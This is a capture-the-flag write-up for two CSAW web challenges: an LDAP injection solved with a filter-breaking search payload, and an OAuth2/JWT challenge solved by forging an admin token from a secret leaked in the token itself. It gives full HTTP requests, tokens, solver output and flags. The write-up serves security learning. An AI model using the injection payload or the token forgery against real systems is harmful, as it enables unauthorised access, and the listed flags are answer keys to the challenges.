<a name="ldab"/>

# Ldab

Difficulty: **★☆☆☆☆**

Sovled: **432 / 1448**

Tag: **Blackbox, Ldap injection**

Link: **http://web.chal.csaw.io:8080**

**Idea**
- Search for list all of all users and groups 

**Solution**
1. Payload ldap injection [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20injection)
2. Request `/index.php?search=*)(uid=*))(|(uid=*`
3. Flag `flag{ld4p_inj3ction_i5_a_th1ng}`

<a name="sso"/>

# SSO

Difficulty: **★★★☆☆**

Sovled: **210 / 1448**

Tag: **Blackbox, oauth2, sigle sign on, JWT token**

Link: **web.chal.csaw.io:9000**

**Idea**
- Use oauth 2.0 for authentication and request the resources
- Crack signature jwt for get flag

**Solution**
1. Get code authorization: `/oauth2/authorize`
 - response_type: `code`
 - redirect_uri: `http://web.chal.csaw.io:9000/protected`
 - state: `http://web.chal.csaw.io:9000/protected`
 - scopy: `http://web.chal.csaw.io:9000/protected`
 - client_id: `admin`
 - client_secret: `admin`

*Request*
```
POST /oauth2/authorize  HTTP/1.1
Host: web.chal.csaw.io:9000
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 228

response_type=code&redirect_uri=http://web.chal.csaw.io:9000/protected&state=http%3A%2F%2Fweb.chal%2Ecsaw%2Eio%3a9000%2Fprotected&scope=http%3A%2F%2Fweb.chal%2Ecsaw%2Eio%3a9000%2Fprotected&client_id=admin&client_secret=admin
```
*Response*
```
http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhZG1pbiIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly93ZWIuY2hhbC5jc2F3LmlvOjkwMDAvcHJvdGVjdGVkIiwiaWF0IjoxNTM3MDYzODAzLCJleHAiOjE1MzcwNjQ0MDN9.fTuYlRB4HeXwKC6uo90s4Xqb3UHeoZMAoYjhaMuzdFw&amp;state=http%3A%2F%2Fweb.chal.csaw.io%3A9000%2Fprotected
```

2. Get token for authentication: `/oauth2/token`:
 - code: receive from request 1 
 - state: `http%3A%2F%2Fweb.chal.csaw.io%3A9000%2Fprotected`
 - grant_type: `authorization_code`
 - redirect_uri: `http://web.chal.csaw.io:9000/protected`
 - client_secret: `admin`
 - client_id: `admin`

*Request*
```
POST /oauth2/token HTTP/1.1
Host: web.chal.csaw.io:9000
Connection: close
Origin: http://web.chal.csaw.io:9000
Content-Type: application/x-www-form-urlencoded
Referer: http://web.chal.csaw.io:9000/oauth2/authorize
Content-Length: 411

code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhZG1pbiIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly93ZWIuY2hhbC5jc2F3LmlvOjkwMDAvcHJvdGVjdGVkIiwiaWF0IjoxNTM3MDYzODAzLCJleHAiOjE1MzcwNjQ0MDN9.fTuYlRB4HeXwKC6uo90s4Xqb3UHeoZMAoYjhaMuzdFw&state=http%3A%2F%2Fweb.chal.csaw.io%3A9000%2Fprotected&grant_type=authorization_code&redirect_uri=http://web.chal.csaw.io:9000/protected&client_secret=ufoundme!&client_id=admin
```

*Response*
```
{"token_type":"Bearer","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzA2Mzg3MCwiZXhwIjoxNTM3MDY0NDcwfQ.4Vlaf8qsPoPyNNIX6CNVgn_w1zHbnVJEg5dJQZmMeGk"}
```

*Raw token*
```
{"alg":"HS256","typ":"JWT"}{"type":"user","secret":"ufoundme!","iat":1537063870,"exp":1537064470} + signature`
``` 

3. Crack signature JWT, change token 
 - Crack online on https://jwt.io/
![Crack JWT token](./resource_web/web-sso.png)

4. Get flag 

```
GET /protected HTTP/1.1
Host: web.chal.csaw.io:9000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcwNjM4NzAsImV4cCI6MTUzNzA2NDQ3MH0.0nrhvscHLcDxopIVt6FzV8mn2KhGI4CbEMfOsrHvnJ0
Connection: close
Origin: http://web.chal.csaw.io:9000
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Referer: http://web.chal.csaw.io:9000/oauth2/authorize
Content-Length: 369
```

5. Flag: `flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}`

6. Code python for solve challenge: [here](./resource_web/sso.py)

```
$ Request to oauth2/authorize ...
> Code = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhZG1pbiIsInJlZGlyZWN0X3VyaSI6Imh0dHA6Ly93ZWIuY2hhbC5jc2F3LmlvOjkwMDAvcHJvdGVjdGVkIiwiaWF0IjoxNTM3MTM2NTQ2LCJleHAiOjE1MzcxMzcxNDZ9.kV123Uzgg4H7i_DxNg6u6QCBiFP2y3sMFNzxZhXtrQw
$ Request to oauth2/token ...
> Token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzEzNjU0OCwiZXhwIjoxNTM3MTM3MTQ4fQ.inn4CGJOX4ID6kab4YdK70ZKqBwV0Be92s6dp2yAUvA
$ Crack signature and change data ...
> New token = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcxMzY1NDgsImV4cCI6MTUzNzEzNzE0OH0.60wi5F1gDUUqNLCKLPDAiENUBRJWhFEzE1xeFqc8RrQ
$ Request to /protected ...
flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}
```